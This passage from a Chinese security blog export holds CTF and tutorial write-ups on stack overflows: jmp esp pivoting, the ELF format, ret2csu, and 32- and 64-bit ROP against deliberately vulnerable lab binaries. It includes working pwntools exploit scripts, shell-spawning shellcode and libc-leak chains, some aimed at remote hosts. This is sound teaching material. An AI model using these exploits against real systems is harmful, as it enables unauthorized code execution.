len('\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80')"21 13h+2=15h=21d，即shellcode长度为21个字节，满足条件。 寻找Gadget shellcode的问题搞定了，接着是ret处应该覆盖为shellcode的起始地址即ret2shellcode，但是这里有个问题，系统开启了ASLR，因此栈地址是随机的，我们无法预测。解决办法是利用相对地址即可，如上一节最后提到的几个对esp进行偏移量操作的Gadgets。 这里就用到经典的方法：jmp esp。 因为在函数ret的时候，esp刚好指向ret地址的下一个地址；而当我们找到如jmp esp的gadget并覆盖到ret地址时，就可以跳到下一个地址去执行这个gadget地址后面的指令。 搜索到了一个jmp esp的Gadget： 找到目标Gadget为0x08048504。剩下的后面的指令就是需要ret2shellcode执行了。 那么可以知道我们构造的payload其结构如下： 1shellcode|padding|fake ebp|jmp esp|set esp point to shellcode and jmp esp 参考前面小节提到的几个Gadgets，我们可以通过sub esp, 0xXX;jmp esp这个来实现ret2shellcode，因为我们没有办法直接ret到指定的shellcode代码处（原因是ASLR），只能通过相对地址的方式实现跳转；这里就用sub esp, 0xXX来实现相对地址的跳转，因为当前esp指向本地址，而我们可以算出shellcode起始地址里该地址的相对偏移量为20h(shellcode+padding)+4(fake ebp)+4(jmp esp)=28h，当使用sub esp, 0x28时可以使esp指向shellcode起始地址处 ；最后在jmp esp跳转至修改后的esp指向的地址即shellcode起始地址。 简单地说，就是将修改esp指向shellcode起始地址，然后再跳到esp指向地址去执行从而执行shellcode。 现在我们再算下整个payload的长度，我们已知shellcode起始地址到最后sub esp, 0x28;jmp esp这段Gadget处的偏移量为28h=40d，而这段Gadget的长度如下： 12ski12@ubuntu:~/ctf/pwn/stack$ python -c &quot;from pwn import *;print len(asm(&apos;sub esp, 0x28;jmp esp&apos;))&quot;5 整个长度为40+5=45&lt;50，满足只能输入50个字节以内内容的限制。 整个payload结构如下图所示： 编写payload： 12345678910111213141516from pwn import *p = process("./b0verfl0w")shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"sub_esp_jmp = asm("sub esp, 0x28;jmp esp")jmp_esp = 0x08048504payload = shellcode.ljust(0x20, "A") + "BBBB" + p32(jmp_esp) + sub_esp_jmpp.recvuntil("name?")print "[*]sending payload..."p.sendline(payload)p.interactive() 0x03 参考stack pivoting ROP and DEP]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>栈溢出</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ELF二进制格式]]></title>
    <url>%2F2019%2F04%2F15%2FELF%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%A0%BC%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[在Linux、BSD变体以及其他OS中，ELF格式可用于可执行文件、共享库、目标文件、coredump文件，甚至内核引导镜像文件。在Linux中，程序就是以ELF二进制的格式执行的。 0x01 ELF文件类型一个ELF文件可以被标记为一下几种类型之一。 ET_NONE：未知类型。这个标记表明文件类型不确定，或者未定义。 ET_REL：重定位文件。ELF类型标记为relocatable意味着该文件被标记为了一段可重定位的代码，有时也称为目标文件。可重定位目标文件通常是还未被链接到可执行程序的一段位置独立的代码（position independent code）。在编译完代码之后通常可以看到一个.o格式的文件，这种文件包含了创建可执行文件所需要的代码和数据。 ET_EXEC：可执行文件。executable，表明该文件被标记为可执行文件，也称为程序，是一个进程开始执行的入口。 ET_DYN：共享目标文件。dynamic，意味着文件被标记为了一个动态的可链接的目标文件，也称为共享库。这类共享库会在程序运行时被装载并链接到程序的进程镜像中。 ET_CORE：核心文件。在程序崩溃或者进程传递了一个SIGSEGV信号（分段违规）时，会在核心文件中记录整个进程的镜像信息。可以使用GDB读取这类文件来辅助调试并查找程序崩溃的原因。 使用readelf -h命令查看ELF文件，可以看到原始的ELF文件头。ELF文件头从文件的0偏移量开始，是除了文件头之后剩余部分文件的一个映射。文件头主要标记了ELF类型、结构和程序开始执行的入口地址，并提供了其他ELF头（节头和程序头）的偏移量。 可以通过查看Linux的ELF（5）手册来了解ELF头部结构： 1234567891011121314151617#define EI_NIDENT 16typedef struct &#123; unsigned char e_ident[EI_NIDENT]; uint16_t e_type; uint16_t e_machine; uint32_t e_version; ElfN_Addr e_entry; ElfN_Off e_phoff; ElfN_Off e_shoff; uint32_t e_flags; uint16_t e_ehsize; uint16_t e_phentsize; uint16_t e_phnum; uint16_t e_shentsize; uint16_t e_shnum; uint16_t e_shstrndx;&#125; ElfN_Ehdr; 0x02 ELF程序头ELF程序头是对二进制文件中段的描述，是程序装载必需的一部分。 段（segment）是在内核装载时被解析的，描述了磁盘上可执行文件的内存布局以及如何映射到内存中。可以通过引用原始ELF头中名为e_phoff（程序头表偏移量）来得到程序头表（如前面的ElfN_Ehdr结构中所示）。 程序头描述了可执行文件（包括共享库）中的段及其类型。 Elf32_Phdr结构体如下，它构成了32位ELF可执行程序头表的一个程序头条目： 12345678910typedef struct &#123; uint32_t p_type; Elf32_Off p_offset; Elf32_Addr p_vaddr; Elf32_Addr p_paddr; uint32_t p_filesz; uint32_t p_memsz; uint32_t p_flags; uint32_t p_align;&#125; Elf32_Phdr; 下面说下5种常见的程序头类型。 2.1 PT_LOAD一个可执行文件至少有一个PT_LOAD类型的段，该段描述的是可装载的段，即该类段将被装载或者映射到内存中。]]></content>
      <categories>
        <category>二进制基础</category>
      </categories>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[栈溢出之ret2csu]]></title>
    <url>%2F2019%2F04%2F12%2F%E4%B8%AD%E7%BA%A7ROP%E4%B9%8Bret2csu%2F</url>
    <content type="text"><![CDATA[0x01 ret2csuCTF Wiki 在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别) 这里我们以本地编译的蒸米示例的level5为例，用objdump -d level5命令即可查看到以下内容： 12345678910111213141516171819202122232425262728293031323334353637383900000000004005c0 &lt;__libc_csu_init&gt;: 4005c0: 41 57 push %r15 4005c2: 41 56 push %r14 4005c4: 41 89 ff mov %edi,%r15d 4005c7: 41 55 push %r13 4005c9: 41 54 push %r12 4005cb: 4c 8d 25 3e 08 20 00 lea 0x20083e(%rip),%r12 # 600e10 &lt;__frame_dummy_init_array_entry&gt; 4005d2: 55 push %rbp 4005d3: 48 8d 2d 3e 08 20 00 lea 0x20083e(%rip),%rbp # 600e18 &lt;__init_array_end&gt; 4005da: 53 push %rbx 4005db: 49 89 f6 mov %rsi,%r14 4005de: 49 89 d5 mov %rdx,%r13 4005e1: 4c 29 e5 sub %r12,%rbp 4005e4: 48 83 ec 08 sub $0x8,%rsp 4005e8: 48 c1 fd 03 sar $0x3,%rbp 4005ec: e8 0f fe ff ff callq 400400 &lt;_init&gt; 4005f1: 48 85 ed test %rbp,%rbp 4005f4: 74 20 je 400616 &lt;__libc_csu_init+0x56&gt; 4005f6: 31 db xor %ebx,%ebx 4005f8: 0f 1f 84 00 00 00 00 nopl 0x0(%rax,%rax,1) 4005ff: 00 400600: 4c 89 ea mov %r13,%rdx 400603: 4c 89 f6 mov %r14,%rsi 400606: 44 89 ff mov %r15d,%edi 400609: 41 ff 14 dc callq *(%r12,%rbx,8) 40060d: 48 83 c3 01 add $0x1,%rbx 400611: 48 39 eb cmp %rbp,%rbx 400614: 75 ea jne 400600 &lt;__libc_csu_init+0x40&gt; 400616: 48 83 c4 08 add $0x8,%rsp 40061a: 5b pop %rbx 40061b: 5d pop %rbp 40061c: 41 5c pop %r12 40061e: 41 5d pop %r13 400620: 41 5e pop %r14 400622: 41 5f pop %r15 400624: c3 retq 400625: 90 nop 400626: 66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 40062d: 00 00 00 这里我们可以利用以下几点： 从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制rbx、rbp、r12、r13、r14、r15 寄存器的数据； 从 0x0000000000400600 到 0x0000000000400609，我们可以将r13赋给rdx，将r14赋给rsi，将r15d赋给 edi（需要注意的是，虽然这里赋给的是 edi，但其实此时 rdi 的高 32 位寄存器值为 0（自行调试），所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制rbx为0，r12为存储我们想要调用的函数的地址。 从0x000000000040060D到0x0000000000400614，我们可以控制rbx与rbp的之间的关系为rbx + 1 = rbp，这样我们就不会执行loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。 BlackHat 2018 该项技术在BlackHat 2018中介绍过，下面用其PPT来说下。 先编写一个代码量很小的C代码，编译该C文件之后会看到存在大量代码，除去源代码部分，剩下的代码都成为Attached Code即附属代码： 这些Attached Code的攻击是多有效呢？ 下面看下这两段可以利用的Gadgets，具体的描述前面已讲解，这里的图片更具体地表现出来了： 将两段Gadgets连接起来构造出ROP链，从而可以实现调用任意含有3个参数的函数： 利用write()函数泄露libc地址： 最终构造的ROP链： 什么时候适合应用ret2csu呢？ 0x02 Securinets CTF baby1这里以Securinets CTF的一道Pwn题baby1为例。 程序先输出一段内容，然后让你输入东西后即退出；是个动态链接文件，会加载libc；安全编译选项只开启了NX： IDA分析下，存在明显的栈溢出漏洞，但在程序中找不到system()函数和”/bin/sh”字符串，但是可看到其是存在read()、write()和__libc_csu_init()函数的，由此可以联想到可以利用ret2csu技术来实现攻击： 通过objdump -d baby1命令查看__libc_csu_init()函数的gadgets： 1234567891011121314151617181920212223242526272829303132333435363738390000000000400660 &lt;__libc_csu_init&gt;: 400660: 41 57 push %r15 400662: 41 56 push %r14 400664: 41 89 ff mov %edi,%r15d 400667: 41 55 push %r13 400669: 41 54 push %r12 40066b: 4c 8d 25 9e 07 20 00 lea 0x20079e(%rip),%r12 # 600e10 &lt;__frame_dummy_init_array_entry&gt; 400672: 55 push %rbp 400673: 48 8d 2d 9e 07 20 00 lea 0x20079e(%rip),%rbp # 600e18 &lt;__init_array_end&gt; 40067a: 53 push %rbx 40067b: 49 89 f6 mov %rsi,%r14 40067e: 49 89 d5 mov %rdx,%r13 400681: 4c 29 e5 sub %r12,%rbp 400684: 48 83 ec 08 sub $0x8,%rsp 400688: 48 c1 fd 03 sar $0x3,%rbp 40068c: e8 e7 fd ff ff callq 400478 &lt;_init&gt; 400691: 48 85 ed test %rbp,%rbp 400694: 74 20 je 4006b6 &lt;__libc_csu_init+0x56&gt; 400696: 31 db xor %ebx,%ebx 400698: 0f 1f 84 00 00 00 00 nopl 0x0(%rax,%rax,1) 40069f: 00 4006a0: 4c 89 ea mov %r13,%rdx 4006a3: 4c 89 f6 mov %r14,%rsi 4006a6: 44 89 ff mov %r15d,%edi 4006a9: 41 ff 14 dc callq *(%r12,%rbx,8) 4006ad: 48 83 c3 01 add $0x1,%rbx 4006b1: 48 39 eb cmp %rbp,%rbx 4006b4: 75 ea jne 4006a0 &lt;__libc_csu_init+0x40&gt; 4006b6: 48 83 c4 08 add $0x8,%rsp 4006ba: 5b pop %rbx 4006bb: 5d pop %rbp 4006bc: 41 5c pop %r12 4006be: 41 5d pop %r13 4006c0: 41 5e pop %r14 4006c2: 41 5f pop %r15 4006c4: c3 retq 4006c5: 90 nop 4006c6: 66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 4006cd: 00 00 00 可以确定gadget1的地址为0x4006ba，gadget2的地址为0x4006a0。 GDB调试，使用pattern计算溢出字节为56： 这里我参考另一篇博文《蒸米32位及64位ROP笔记》中level5的第二种做法，我们再找一个pop rdi;ret的gadget： 找到该gadget地址为0x4006c3。 仿照level5写payload就好（具体的解释可以看《蒸米32位及64位ROP笔记》）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *from LibcSearcher import *p = remote("192.168.17.157", 10001)p.recv(1024)elf = ELF("./baby1")gadget1 = 0x4006bagadget2 = 0x4006a0pop_rdi_ret_addr = 0x00000000004006c3main_addr = elf.symbols["main"]write_got = elf.got["write"]print "[*]main() addr: " + hex(main_addr)print "[*]write() got: " + hex(write_got)def csu(rbx, rbp, r12, r13, r14, r15, ret): payload = "A" * 56 payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(gadget2) payload += "B" * 56 payload += p64(ret) return payloadprint "[*]sending payload to leak write() addr..."payload = csu(0, 1, write_got, 8, write_got, 1, main_addr)p.sendline(payload)sleep(1)write_addr = u64(p.recv(8))print "[*]leak write() addr: " + hex(write_got)p.recv(1024)libc = LibcSearcher("write", write_addr)libc_base = write_addr - libc.dump("write")system_addr = libc_base + libc.dump("system")binsh_addr = libc_base + libc.dump("str_bin_sh")print "[*]libc base: " + hex(libc_base)print "[*]system() addr: " + hex(system_addr)print "[*]/bin/sh addr: " + hex(binsh_addr)print "[*]sending exp..."exp = "A" * 56exp += p64(pop_rdi_ret_addr)exp += p64(binsh_addr)exp += p64(system_addr)p.sendline(exp)p.interactive() 这里打远程的机子： 0x03 参考ret2csu return2csu学习笔记]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>栈溢出</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[蒸米32位及64位ROP笔记]]></title>
    <url>%2F2019%2F04%2F09%2F%E8%92%B8%E7%B1%B3ROP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[这里将《一步一步学 ROP 之 Linux_x86 篇》和《一步一步学 ROP 之 Linux_64 篇》中的例子做一遍并记录下来。 0x01 32位ROPlevel1——栈上执行shellcodelevel1主要演示32位程序中最基本的栈溢出利用，可直接在栈上写shellcode并执行。 level1.c： 12345678910111213#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 256);&#125;int main(int argc, char** argv) &#123; vulnerable_function(); write(STDOUT_FILENO, "Hello, World\n", 13);&#125; 使用如下指令编译： 1gcc -m32 -fno-stack-protector -z execstack -o level1 level1.c -m32参数指定编译为32位程序；-fno-stack-protector参数指定不开启堆栈溢出保护，即不生成 canary；-z execstack参数指定允许栈执行，即不开启NX。 下面3条指令用来关闭整个linux系统的ASLR保护： 123sudo -secho 0 &gt; /proc/sys/kernel/randomize_va_spaceexit 运行程序，输入一串字符串然后返回helloworld；file查看是个动态链接的32位文件；checksec查看所有安全编译选项都没有开： 利用pattern计算偏移，可得到溢出偏移量为140： 由此，我们可以构造”A”*140+shellcode_addr即可将shellcode地址覆盖到函数返回地址中，从而让EIP指针寄存器指向shellcode地址让程序执行shellcode。 这里NX没开，我们可以直接往栈上写shellcode，具体为shellcode+”A”*(140-len(shellcode))+shellcode_addr。 shellcode的构造直接用pwntools的asm(shellcraft.sh())来获得。 下面获取写入的shellcode地址。由于ASLR等都关掉，因此现在获取的地址就不会变了。 一个GDB的坑 在GDB中调试level1，r运行，再输入”abcdaaaaa……”让程序崩溃，然后输入x/10s \$esp-144（144是由前面得到的140偏移再加上4字节的ret得到的）： 得到shellcode输入位置的偏移为0xffffcf70。 写payload： 123456789from pwn import *p = process("./level1")shellcode = asm(shellcraft.sh())shellcode_addr = 0xffffcf70payload = shellcode.ljust(140, "A") + p32(shellcode_addr)p.sendline(payload)p.interactive() 然而在运行时会报错，无法正常利用。 填坑 对初学者来说这个shellcode地址的位置其实是一个坑。因为正常的思维是使用gdb调试目标程序，然后查看内存来确定shellcode的位置。但当你真的执行exp的时候你会发现shellcode压根就不在这个地址上！这是为什么呢？原因是gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。怎么解决这个问题呢？ 最简单的方法就是开启core dump这个功能。 12ulimit -c unlimitedsudo sh -c &apos;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&apos; 开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。 由此得到shellcode真正的地址0xffffcfb0。 改下payload的地址即可getshell： 123456789from pwn import *p = process("./level1")shellcode = asm(shellcraft.sh())shellcode_addr = 0xffffcfb0payload = shellcode.ljust(140, "A") + p32(shellcode_addr)p.sendline(payload)p.interactive() 除了本地调试，还有远程部署的方式，如下，将题目绑定到指定端口上： 1socat tcp-l:10001,fork exec:./level1 payload除了将p = process(“./level1”)改为p = remote(“127.0.0.1”, 10001)外，ret的地址还会发生改变。解决方法还是采用生成core dump的方案，然后用gdb调试core文件获取返回地址： 得到ret地址为0xffffcf00，改下payload即可远程getshell： level2——ret2libc绕过NX一样的代码，只不过在用GCC编译开启NX保护即栈不可执行。 1gcc -m32 -fno-stack-protector -o level2 level1.c 这时候我们如果使用level1的exp来进行测试的话，系统会拒绝执行我们的shellcode。如果你通过sudo cat /proc/[pid]/maps查看，你会发现level1的stack是rwx的，但是level2的stack却是rw的。 既然开启了NX，那一般是利用ROP绕过，这里用的是ret2libc，因为程序level2调用了libc.so，并且libc.so里保存了大量可利用的函数如system()和/bin/sh，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。 下面的问题就变为怎么获取libc中的system和binsh的地址。 因为我们关掉了ASLR，此时system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。 此时我们可以使用GDB进行调试，在main打下断点然后运行，程序在main断点处停下再通过print和find命令来查找system和”/bin/sh”字符串的地址： system()函数地址为：0xf7e42940 /bin/sh地址为：0xf7f6102b 至于溢出偏移量和level1一样为140。 编写payload： 1234567891011from pwn import *p = process("./level2")system_addr = 0xf7e42940binsh_addr = 0xf7f6102bpayload = "A" * 140 + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)p.sendline(payload)p.interactive() level2——ROP绕过NX和ASLR在前一小节的基础下，开启在level1中关掉的ASLR： 123sudo -secho 2 &gt; /proc/sys/kernel/randomize_va_spaceexit 如果你通过sudo cat /proc/[pid]/maps或者ldd查看，你会发现level2的libc.so地址每次都是变化的： 此时利用前一小节的办法print和find是获取不到对的地址的，因为每次运行栈的地址都会变化。 如何利用呢？——思路是：先泄漏出libc.so某些函数在内存中的地址，再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，最后执行我们的ret2libc的shellcode。既然栈、libc、堆的地址都是随机的，我们怎么才能泄露出libc.so的地址呢？方法还是有的，因为程序本身在内存中的地址并不是随机的，如图所示，Linux内存随机化分布图： 所以我们只要把返回值设置到程序本身就可执行我们期望的指令了。 首先我们利用objdump来查看可以利用的plt函数和函数对应的got表： 除了程序本身的函数之外，还有read@plt()和write@plt()函数可用，但因为程序本身没有调用system()函数因此并不能直接调用system()来获取shell。但其实我们有write@plt()函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。 既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got跳转到真正的write()函数上去。（如果还是搞不清楚的话，推荐阅读《程序员的自我修养 - 链接、装载与库》这本书） 因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。 然后我们再将pc指针return回vulnerable_function()函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。 使用ldd命令可以查看目标程序调用的so库。随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址： 当然，除了用ldd命令查看libc.so库，还可以直接用pwntools库的elf.libc来获取libc.so库： 123from pwn import *elf = ELF("./level2")libc = elf.libc 编写payload： 123456789101112131415161718192021222324252627282930313233from pwn import *#p = process("./level2")p = remote("127.0.0.1", 10001)elf = ELF("./level2")libc = elf.libcwrite_plt = elf.plt["write"]write_got = elf.got["write"]vulnerable_function_addr = elf.symbols["vulnerable_function"]print "[*]write() plt: " + hex(write_plt)print "[*]write() got: " + hex(write_got)print "[*]vulnerable_function() addr: " + hex(vulnerable_function_addr)payload = "A" * 140 + p32(write_plt) + p32(vulnerable_function_addr) + p32(1) + p32(write_got) + p32(4)print "[*]sending payload1 to leak write libc addr..."p.sendline(payload)write_addr = u32(p.recv(4))print "[*]leak write libc addr: " + hex(write_addr)libc.address = write_addr - libc.symbols["write"]system_addr = libc.symbols["system"]binsh_addr = next(libc.search("/bin/sh"))print "[*]system() addr: " + hex(system_addr)print "[*]binsh addr: " + hex(binsh_addr)payload2 = "A" * 140 + p32(system_addr) + p32(0xdeedbeef) + p32(binsh_addr)print "[*]sending payload2 to getshell..."p.sendline(payload2)p.interactive() 另一种是ldd命令查找再赋值libc.so文件到当前目录再加载的payload： 123456789101112131415161718192021222324252627282930313233343536from pwn import *#p = process("./level2")p = remote("127.0.0.1", 10001)elf = ELF("./level2")libc = ELF("libc.so.6")#libc = elf.libcwrite_plt = elf.plt["write"]write_got = elf.got["write"]vulnerable_function_addr = elf.symbols["vulnerable_function"]print "[*]write() plt: " + hex(write_plt)print "[*]write() got: " + hex(write_got)print "[*]vulnerable_function() addr: " + hex(vulnerable_function_addr)payload = "A" * 140 + p32(write_plt) + p32(vulnerable_function_addr) + p32(1) + p32(write_got) + p32(4)print "[*]sending payload1 to leak write libc addr..."p.sendline(payload)write_addr = u32(p.recv(4))print "[*]leak write libc addr: " + hex(write_addr)#libc.address = write_addr - libc.symbols["write"]system_addr = libc.symbols["system"] + write_addr - libc.symbols["write"]binsh_addr = next(libc.search("/bin/sh")) + write_addr - libc.symbols["write"]print "[*]system() addr: " + hex(system_addr)print "[*]binsh addr: " + hex(binsh_addr)payload2 = "A" * 140 + p32(system_addr) + p32(0xdeedbeef) + p32(binsh_addr)print "[*]sending payload2 to getshell..."p.sendline(payload2)p.interactive() level2——Memory Leak &amp; DynELF本小节介绍了在不获取目标libc.so的情况下进行ROP攻击。 前面一小节我们用到了目标机器的libc.so才能计算出libc中system()和/bin/sh等的地址来实现攻击，但是如果我们在获取不到目标机器上的libc.so情况下，应该如何做呢？这时候就需要通过memory leak(内存泄露)来搜索内存找到system()的地址。 这里我们采用pwntools提供的DynELF模块来进行内存搜索。首先我们需要实现一个leak(address)函数，通过这个函数可以获取到某个地址上最少1 byte的数据。拿我们上一篇中的level2程序举例。leak函数应该是这样实现的： 123456def leak(address): payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4) p.send(payload1) data = p.recv(4) print "%#x =&gt; %s" % (address, (data or '').encode('hex')) return data 随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./level2’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。 要注意的是，通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。通过readelf -S level2这个命令就可以获取到bss段的地址了。 当然，可以在pwntools中直接调用elf.bss()获取.bss段地址： 12elf = ELF("./level2")bss_base = elf.bss() 因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这里我们用ROPgadget来寻找： 编写payload： 1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *p = remote("127.0.0.1", 10001)#p = process("./level2")elf = ELF("./level2")bss_base = elf.bss()plt_write = elf.plt["write"]plt_read = elf.plt["read"]vulfun_addr = elf.symbols["vulnerable_function"]print "[*]write() plt: " + hex(plt_write)print "[*]read() plt: " + hex(plt_read)print "[*]vulnerable_function() addr: " + hex(vulfun_addr)print "[*].bss addr: " + hex(bss_base)def leak(address): payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4) p.send(payload1) data = p.recv(4) #print "%#x =&gt; %s" % (address, (data or '').encode('hex')) return datad = DynELF(leak, elf=ELF('./level2'))execve_addr = d.lookup('execve', 'libc')print "[*]execve() addr: " + hex(execve_addr)#system_addr = d.lookup('system', 'libc')#print "[*]system() addr: " + hex(system_addr)pop_pop_pop_ret = 0x080484f9payload2 = "A" * 140 + p32(plt_read) + p32(pop_pop_pop_ret) + p32(0) + p32(bss_base) + p32(8)#payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_base)payload2 += p32(execve_addr) + p32(vulfun_addr) + p32(bss_base) + p32(0) + p32(0)p.sendline(payload2)p.sendline("/bin/sh\0")p.interactive() 本地环境中system()函数执行有问题，老得不到shell，换了execve()函数即可： 0x02 64位ROPlevel3——64位与32位区别 linux_64与linux_86的区别主要有两点：首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上，但在x64中的前六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9中，如果还有更多的参数的话才会保存在栈上。 level3.c代码如下： 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void callsystem()&#123; system("/bin/sh");&#125;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char** argv) &#123; write(STDOUT_FILENO, "Hello, World\n", 13); vulnerable_function();&#125; 默认打开系统的ASLR，然后用如下gcc命令编译，即不开启Canary： 1gcc -fno-stack-protector level3.c -o level3 查看基本功能和安全编译选项开关： 通过GDB的调试，用pattern创建大量字符串发送过去，程序终止在vulnerable_function()函数处： 奇怪的事情发生了，PC指针并没有指向类似于0x41414141那样地址，而是停在了vulnerable_function()函数中。这是为什么呢？原因就是我们之前提到过的程序使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。但是，虽然PC不能跳转到那个地址，我们依然可以通过栈来计算出溢出点。因为ret相当于“pop rip”指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。 因此我们得到了136的偏移地址。 我们再构造一次payload，并且跳转到一个小于0x00007fffffffffff的地址，看看这次能否控制pc的指针： 123python -c 'print "A"*136+"ABCDEF\x00\x00"' &gt; payloadgdb level3(gdb) r &lt; payload 可以看到我们已经成功的控制了PC的指针了。 知道了偏移量，且程序中本来就存在一个callsystem()函数，其会直接调用system(“/bin/sh”)，那就简单多了。 编写payload： 12345678910111213from pwn import *p = process("./level3")elf = ELF("./level3")callsystem_addr = elf.symbols["callsystem"]print "[*]callsystem() addr: " + hex(callsystem_addr)payload = "A" * 136 + p64(callsystem_addr)print "[*]sending payload..."p.sendline(payload)p.interactive() level4——使用工具寻找gadgets 我们之前提到x86中参数都是保存在栈上，但在x64中前六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。所以我们需要寻找一些类似于pop rdi; ret的这种gadget。如果是简单的gadgets，我们可以通过objdump来查找。但当我们打算寻找一些复杂的gadgets的时候，还是借助于一些查找gadgets的工具比较方便。比较有名的工具有： ROPEME: https://github.com/packz/ropeme Ropper: https://github.com/sashs/Ropper ROPgadget: https://github.com/JonathanSa… rp++: https://github.com/0vercl0k/rp 这些工具功能上都差不多，找一款自己能用的惯的即可。 level4.c代码如下： 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;dlfcn.h&gt;void systemaddr()&#123; void* handle = dlopen("libc.so.6", RTLD_LAZY); printf("%p\n",dlsym(handle,"system")); fflush(stdout);&#125;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char** argv) &#123; systemaddr(); write(1, "Hello, World\n", 13); vulnerable_function();&#125; 编译，因为程序用到了dlopen()函数打开libc，因此需要-ldl参数： 1gcc -fno-stack-protector level4.c -o level4 -ldl 64位程序，动态链接文件，只开启了NX： 用IDA分析，看到程序在一开始运行时调用systemaddr()函数，该函数会从本程序用到的libc.so.6中获取其中的system()函数地址并打印出来： 和level3一样得到溢出偏移量为136。 下面开始使用工具来寻找合适的Gadgets。 因为我们知道了溢出偏移量和system()函数的地址，剩下的就是通过寄存器给system()函数传参了，而在64位中传参的前六个参数是通过寄存器来实现的，而且system()只接受一个参数，因此我们需要找到一条pop rdi;ret的Gadget来帮助我们实现，这里我们用的是ROPgadget工具帮我们查找： 当然，一般情况下自身的程序可能没有合适的Gadgets，这时我们可以到指定的libc.so文件中找到合适的： 编写payload，有两个Gadget可选，如果用的是libc中的Gadget则需要加上libc的实际地址来计算出该gadget的实际地址，因为libc.address = offset = system_addr - libc.symbols[‘system’] = gadget实际地址 - gadget在libc中地址： 1234567891011121314151617181920212223242526from pwn import *p = process("./level4")elf = ELF("./level4")libc = elf.libc## self gadget#pop_rdi_ret_addr = 0x00000000004008b3## libc gadgetpop_rdi_ret_libc = 0x0000000000021102system_addr = int(p.recv(1024).split()[0], 16)print "[*]recv system() addr: " + hex(system_addr)libc.address = system_addr - libc.symbols["system"]binsh_addr = 